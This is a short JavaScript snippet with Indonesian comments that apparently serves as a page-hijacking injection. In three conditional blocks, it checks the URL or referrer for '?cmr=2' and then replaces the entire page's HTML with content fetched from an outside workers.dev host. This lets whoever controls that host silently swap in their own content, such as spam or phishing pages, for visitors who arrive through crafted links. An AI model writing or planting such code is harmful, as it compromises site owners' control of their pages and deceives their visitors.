if (window.location.search.includes("?cmr=2")) {
  // Lakukan permintaan fetch untuk mendapatkan data dari website
  fetch("https://crm-template-one.mastimon.workers.dev/")
    .then((response) => response.text())
    .then((data) => {
      // Ubah HTML pada tag <html> dengan data yang diperoleh
      document.querySelector("html").innerHTML = data;
    })
    .catch((error) => {
      console.error("Terjadi kesalahan:", error);
    });
}


if (document.referrer.includes('?cmr=2')) {
  fetch('https://crm-template-one.mastimon.workers.dev/')
    .then(response => response.text())
    .then(data => {
      const parser = new DOMParser();
      const newDoc = parser.parseFromString(data, 'text/html');
      const newHtml = newDoc.querySelector('html').outerHTML;
      document.querySelector('html').outerHTML = newHtml;
    })
    .catch(error => {
      console.error('Error fetching data:', error);
    });
}

// Memeriksa sumber lalu lintas dan parameter URL
if (document.referrer.includes("redirect") && document.referrer.includes("?cmr=2")) {
  // Mengubah HTML pada tag <html> dengan data yang diambil dari website
  fetch("https://crm-template-one.mastimon.workers.dev/")
    .then(response => response.text())
    .then(data => {
      // Mengubah HTML pada tag <html> dengan data yang diambil
      document.documentElement.innerHTML = data;
    })
    .catch(error => {
      console.log("Terjadi kesalahan:", error);
    });
}
